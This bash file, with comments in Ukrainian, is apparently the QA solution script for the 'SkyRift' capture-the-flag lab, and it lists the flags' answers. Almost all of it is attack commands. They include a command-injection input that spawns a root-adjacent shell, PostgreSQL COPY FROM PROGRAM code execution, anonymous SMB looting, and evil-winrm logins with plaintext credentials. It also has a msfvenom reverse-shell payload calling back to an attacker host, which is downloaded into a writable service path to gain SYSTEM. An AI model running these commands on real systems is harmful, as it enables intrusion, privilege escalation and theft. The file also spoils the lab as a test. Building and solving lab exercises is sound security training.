#!/bin/bash
# SkyRift CTF — QA команди для проходження
# Запускай потрібну секцію або копіюй команди

# ============================================================
# OPERATOR_STATION (після SSH входу як operator)
# ============================================================

# Додати Flag_4 в MOTD
echo "flag{n1ce_t0_s33_y0u}" | sudo tee -a /etc/motd

# Перевірити Flag_4
cat ~/flag.txt

# Перевірити sudo права
sudo -l

# Flag_5 — command injection (privesc до commador)
sudo -u commador /opt/dronecorp/tools/flight_log_export.py
# Ввести: ; /bin/bash ;

# Перевірити Flag_5
cat /home/commador/flag.txt

# Знайти DB креди
cat /home/commador/scripts/backup_db.sh

# ============================================================
# DB_STATION (підключення до PostgreSQL)
# ============================================================

# Підключення
psql -h 10.10.50.100 -U tech2 -d dronecorp_db
# пароль: adfGt54DCf  (це і є Flag_6)

# Flag_7 — RCE через PostgreSQL
# (виконувати всередині psql)
# CREATE TABLE cmd_exec (output text);
# COPY cmd_exec FROM PROGRAM 'cat /var/lib/postgresql/flag.txt';
# SELECT * FROM cmd_exec;

# ============================================================
# WINDOWS SERVER (SMB — анонімний доступ)
# ============================================================

# Перевірити SMB шари
smbclient -L //10.10.50.150 -N

# Підключитись та забрати файли
smbclient //10.10.50.150/Updates -N
# get flag.txt
# get deploy_update.ps1

# WinRM підключення як svc_deploy
evil-winrm -i 10.10.50.150 -u svc_deploy -p "Deploy@2024!Drone"

# ============================================================
# WINDOWS SERVER (всередині WinRM сесії як svc_deploy)
# ============================================================

# Знайти вразливий сервіс
# wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"

# Перевірити права запису
# icacls "C:\Program Files"

# Створити payload (на Kali)
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=5555 -f exe -o Drone.exe

# Завантажити payload на Windows
# Invoke-WebRequest http://<KALI_IP>/Drone.exe -OutFile "C:\Program Files\Drone.exe"

# Перезапустити сервіс
# sc.exe stop DroneUpdateAgent
# sc.exe start DroneUpdateAgent

# Flag_9 (після отримання SYSTEM)
# type C:\Users\Administrator\Desktop\flag.txt

# Flag_10 (з SYSTEM сесії)
# reg query HKLM\SOFTWARE\DroneCorp\UpdateSync
# type C:\ProgramData\DroneOps\update_server.conf

# ============================================================
# UPDATE SERVER (після отримання grayraven кредів)
# ============================================================

ssh -o HostKeyAlgorithms=+ssh-rsa grayraven@192.168.125.55
# пароль: grayraven124
